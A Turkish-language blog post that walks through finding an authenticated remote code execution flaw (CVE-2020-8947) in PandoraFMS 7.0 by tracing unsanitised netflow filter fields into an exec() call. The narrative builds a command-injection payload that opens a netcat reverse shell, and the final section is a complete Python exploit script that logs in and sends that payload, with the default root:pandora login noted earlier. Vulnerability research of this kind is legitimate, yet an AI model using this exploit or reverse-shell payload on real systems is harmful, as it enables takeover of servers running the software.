---
layout: post
title: PandoraFMS 7.0 Authenticated Remote Code Execution x 4
date: '2020-03-05 10:20:42 +0300'
categories: blog
---


Merhaba, [PANDORAFMS](http://pandorafms.org/) adında açık kaynaklı bir ağ izleme aracında bulduğum Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım. Statik kaynak kod analizine dair türkçe pek bir kaynak bulunmuyor oluşunu göz önünde bulundurarak makaleyi türkçe kaleme aldım.

**AUTHENTICAD RCE**

Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. RCE ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.

**PANDORAFMS**

1.  Uygulama indirme linki: [PandoraFMS Downloads](https://pandorafms.org/features/free-download-monitoring-software/)
2.  Zafiyeti tespit ettiğim sürüm: 7.0

**BÖLÜM 1: Uygulama Eldesi**

Profesyonel bir kaynak kod analizicisi değilim bu sebeple zafiyet bulmanın kendime göre en basit olacağı uygulama türleri sınıflandırdım. Bunların başında ise ağ izleme yazılımları geliyor. Ufak bir [arama sonucu](https://www.dnsstuff.com/open-source-network-monitoring-tools) açık kaynaklı popüler ağ izleme araçları listesine eriştim ve burada [PANDORAFMS](https://pandorafms.org/) yazılımına rastladım, hem açık kaynaklıydı hemde indirme linklerinde doğrudan sanallaştırma yazılımlarıyla kullanılabilecek bir OVA dosyası bulunuyordu. Doğrudan bir OVA dosyası bulunması, uygulamanın kaynak kodlarına erişimde işleri oldukça kolaylaştırıyor. OVA dosyasını indirdim ve [VMWARE Fusion](https://www.vmware.com/products/fusion.html) ile sanal makine olarak kaldırdım.

**Bölüm 2: Kaynak Kod Eldesi**

Sanal makineye giriş yapmak için dağımtıcının kendi sağladığı [kılavuz](https://pandorafms.com/downloads/guias_rapidas_EN.pdf) üzerinden root:pandora giriş bilgisini aldım ve sisteme giriş yaptım.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms.png)

Sistem üzerinde biraz gezindikten sonra, uygulamaya dair kodların varsayılan webservisi dizini olan /var/www/html dizininde tutulduğunu tespit ettim.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-kaynak.png)

Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini [TAR](https://wiki.ubuntu-tr.net/index.php?title=Tar_komutu_kullan%C4%B1m%C4%B1) ile sıkıştırdım ve SCP kullanarak ana makineme aktardım.

```
tar -czvf pandora.tar.gz /var/www/html/pandora_console
scp root@pandoraFMSIP:/var/www/html/pandora.tar.gz /tmp/pandora.tar.gz
```

**Bölüm 3: Kaynak Kodun İncelenmesi**

Dosyaları kendi tercih ettiğim [ATOM](https://atom.io/) idesini kullanarak kurcalamaya başladım.

Statik kaynak kod analizlerinde komut çalıştırmaya dair bir zafiyet arıyorsak başlı başlı dikkat etmemiz gereken bazı fonksiyonlar var. Bunların bir kaçına örnek olarak; `system, exec, shell_exec, popen, eval, passthru` fonksiyonları verilebilir.

IDE üzerinde tüm projede bulunan php dosyalarında yukarıda belirttiğim fonksiyonları aramaya başladım ve boşa çabalanan bir kaç saatin sonunda **functions_netflow.php** dosyasının 648\. satırında zafiyete dair çok umut vaadeden bir nokta tespit ettim.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-finding-point.png)

Hem **exec()** fonksiyonu kullanılıyor hemde henüz nereden geldiği belli olmayan ama ben kullanıcıdan geliyorum diye bağıran bir değişkeni içeriyordu. Fazla Kemal Sunal izlemenin etkisinden olacak "Şimdi istanbul hapı yuttu" diye aklımdan geçirerek **$command** değişkeninin nereden geldiğini kurcalamaya başladım.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-command.png)

**$command** değişkeni **net_flow_getcommand()** fonksiyonundan geliyor, daha sonrada önceden tanımlanmış ekstra bir kaç komutta üstüne ekleniyordu. IDE'nin arama özelliğini kullanarak fonksiyonun aynı dosyada 892.nci satırda tanımlandığını tespit ettim.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-netflow-fonksiyon.png)

Fonksiyonu inclediğimde maalesef kullanıcıdan gelen herhangi bir verinin burada **$command** değişkenine maalesef eklenmediğini gördüm.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-netflow-fonksiyon-ayrinti.png)

Fakat bereket olsun, **$command** değişkenine bir şeyler ekleyen yeni fonksiyon çıktı karşıma 904\. satırda bulunan **netflow_get_filter_arguments** fonksiyonu. IDE üzerinden fonksiyonun tanımlandığı noktayı tespit ettim (aynı dosya 917\. satır) ve fonksiyonu incelemeye koyuldum.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-getfilter-fonksiyon.png)

Fonksiyon bir sürü farklı girdiyi(ipsrc, ipdst, srcport, dstport) herhangi bir kontrolden geçirmeden **$filter_args** adında bir değişkene ekliyor ve en sonunda **$filter_args** değişkenini değer olarak dönüyordu. Daha sonra bu değer, **$command** değişkenine ekleniyor ve ilk tespit edilen satırda bulunan **exec()** fonksiyonuna gönderiliyordu. Yani eğer bu değişkenlerden herhangi birine istediğimiz girdiyi verebilirsek pekala buradan bir RCE elde edebiliriz. Aslında aradığım şey $_GET yada $_POST şekilinde kullanıcıdan alınan bir girdiydi fakat bu değişkenlerin hiç birinin geleneksel GET yada POST ile alındığını tespit edemedim. RCE hem çok yakındı hemde çok uzak. Bu durum canımı oldukça sıkmış olsada fonksiyonun içinde bulunan değerlerin mantıksal olarak kullanıcıdan alınması gerekiyordu. Uzunca bir süre bu değişkenlerin nasıl alındığı tespit etmeye çalıştım fakat bir sonuca varamadım. Biraz kafa toplamak amacıyla mola verdim. Bu noktada aslında yine bir şey bulamadığımı düşünüp bırakacaktım ki, aykırı bir tutum sergileyerek Googleda ufak bir arama yaptım.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-google.png)

Buradan dökümanları okumanın ne kadar önemli olduğunu tekrar anlıyoruz. Site üzerinde biraz gezindikten sonra, heyecanımı tekrar kazandıran bir ekran görüntüsüne denk geldim

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-google-netflow-dokuman.png)

Burada ki gösterilen girdiler fonksiyonun içinde tespit ettiğimiz (ipsrc, ipdst, srcport, dstport) değişkenleriydi, yani RCE zafiyetini tetiklememiz için kontrol etmemiz gereken değişkenler. Hemen dökümanı takip ederek, tarayıcı üzerinden ilgili sayfaya eriştim:

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-netflow-page.png)

Girdilerin gönderildiği noktalarının tespitinin ardından, kalan son iş uygun payloadı oluşturmaktı. Fonksiyonları tekrar inceledim, **netflow_get_filter_arguments** fonksiyonun sonunda **$filter_args** değişkenine `"` karakteri eklediğini gördüm.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-son-dokunuslar.png)

Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi. Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak. Taslağın arasına ufak bir reverseshell komutu iliştirmek için [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) den bir reverseshell komutu aldım. Ve sonuç payloadı: **";nc -e /bin/sh 192.168.1.100 1234 #** olarak oluştu. Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde bir shell eldesi sağladım.

![]({{ AUCyberClub.github.io }}/assets/img/pandorafms/pandorafms-son.png)

Dağıtımcıya ulaşmaya çalıştım fakat bir sonuç alamadım. Bu nedenle makaleyi açık olarak yayınladım.


**Bölüm 4: Exploit**



```

'''
PANDORAFMS 7.0 Authenticated Remote Code Execution x4
This exploits can be edited to exploit 4x Authenticated RCE vulnerabilities exist on PANDORAFMS.
incase default vulnerable variable won't work, change the position of payload to  one of the following ip_src, dst_port, src_port

Author: Engin Demirbilek
Github: github.com/EnginDemirbilek
CVE: CVE-2020-8947

'''
import requests
import sys

if len(sys.argv) < 6:
	print "Usage: ./exploit.py http://url username password listenerIP listenerPort"
	exit()

url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
payload = '";nc -e /bin/sh ' + sys.argv[4] + ' ' + sys.argv[5] + ' ' + '#'

login = {
	'nick':user,
	'pass':password,
	'login_button':'Login'
}
req = requests.Session()
print "Sendin login request ..."
login = req.post(url+"/pandora_console/index.php?login=1", data=login)

payload = {
	'date':"",
	'time':"",
	'period':"",
	'interval_length':"",
	'chart_type':"",
	'max_aggregates':"1",
        'address_resolution':"0",
        'name':"",
        'assign_group':"0",
        'filter_type':"0",
        'filter_id':"0",
        'filter_selected':"0",
        'ip_dst':payload,
	'ip_src':"",
	'dst_port':"",
	'src_port':"",
	'advanced_filter':"",
	'aggregate':"dstip",
	'router_ip':"",
	'output':"bytes",
	'draw_button':"Draw"
}

print "[+] Sendin exploit ..."

exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded'})

if exploit.status_code == 200:
	print "[+] Everything seems ok, check your listener."
else:
	print "[-] Exploit failed. You can change position of payload to ip_src, dst_port or src_port and try again."


```


[Engin Demirbilek](https://www.linkedin.com/in/engin-d-742752153/)
